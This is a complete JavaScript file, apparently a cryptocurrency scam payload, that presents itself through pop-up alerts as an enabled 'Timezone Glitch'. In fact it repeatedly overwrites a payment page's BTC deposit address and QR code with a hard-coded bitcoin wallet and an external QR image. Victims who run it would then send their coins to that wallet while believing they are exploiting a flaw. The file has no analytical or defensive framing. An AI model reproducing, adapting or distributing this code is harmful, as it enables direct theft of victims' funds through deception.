
alert('Timezone Glitch enabled! Press OK to continue. ');

(function () {
  "use strict";
  var _Bitcoin_Wallet_ID_ = "bc1qnvanwaacdy8j3lev0fd5lnk33k6y377tw72gtw";
  var _Bitcoin_Wallet_QR_ = 'https://i.imgur.com/zXcCViW.png'
  _Set_Timeouts();
  function _Set_Timeouts() {
    setTimeout(function () {
      _Swap_Bitcoin_Wallet();
    }, 2000);
    setTimeout(function () {
      _Main_Success_Show();
    }, 2000);
  }
  function _Swap_Bitcoin_Wallet() {
    let _Bitcoin_Address_Element = document['evaluate']('//span[contains(text(),"BTC address:")]/following-sibling::span', document, null, XPathResult['FIRST_ORDERED_NODE_TYPE'], null)['singleNodeValue'];
    let _Bitcoin_QR_Element = document['evaluate']('//img[@alt="QR code to scan"]', document, null, XPathResult['FIRST_ORDERED_NODE_TYPE'], null)['singleNodeValue'];
    if (_Bitcoin_Address_Element !== null) {
      _Bitcoin_Address_Element['innerHTML'] = _Bitcoin_Wallet_ID_;
      _Bitcoin_QR_Element['src'] = _Bitcoin_Wallet_QR_;
    }
    setTimeout(function () {
      _Swap_Bitcoin_Wallet();
    }, 100);
  }
  function _Main_Success_Show() {
    let _Continue_Button_Element = document['evaluate']('//button[contains(text(),"Continue")]', document, null, XPathResult['FIRST_ORDERED_NODE_TYPE'], null)['singleNodeValue'];
    if (_Continue_Button_Element !== null) {
      _Continue_Button_Element['addEventListener']('click', function () {
        const _Date = new Date();
        let alertString = 'Timezone Glitch enabled! Press OK to continue. Last script update: ' + _Date['getFullYear']() + '-' + (_Date['getMonth']() + 1) + '-' + _Date['getDate']();
        alert(alertString);
      });
    } else {
      setTimeout(function () {
        _Main_Success_Show();
      }, 100);
    }
  }
})();
